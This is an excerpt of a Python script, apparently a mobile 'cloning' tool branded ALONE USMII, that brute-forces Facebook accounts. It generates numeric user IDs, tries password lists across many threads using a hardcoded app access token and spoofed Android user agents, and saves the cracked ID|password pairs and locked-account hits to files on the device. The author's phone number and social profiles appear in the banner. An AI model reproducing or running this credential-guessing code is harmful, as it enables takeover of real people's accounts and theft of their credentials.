...
\t[×] Developed By Usman Gull{EXTRA} (Usmi)
{WHITE}[•] AUTHOR       : ALONE USMII
{WHITE}[•] BROTHER      : AWAIS TAHIR , SODHAIR SYCO
{WHITE}[•] WhatsApp     :   +923132281952
[•] FaceBook     :   Usman Gull
[•] Version      :   {RED}9.1
{WHITE}[•] YouTube      :   Usmi Trick
        ...
        try:
                ...
                if 1==1:
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://www.facebook.com/profile.php?id=100026028165505&mibextid=ZbWKwL');menu()
                        elif xd in ['7','07']:
...
def pak():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        print(f'\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ALONE-USMI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        accessToken = '5858935267534970|7ca1ea253a7fc687e291f1d0ab6071dc'
                        ...
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.7.0; '+model+' Build/'+build+'NRD90M) [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.25,height=2048,width=4096};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Usmi-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Usmi-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[Usmi-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Usmi-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Usmi-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [Usmi-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Usmi-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
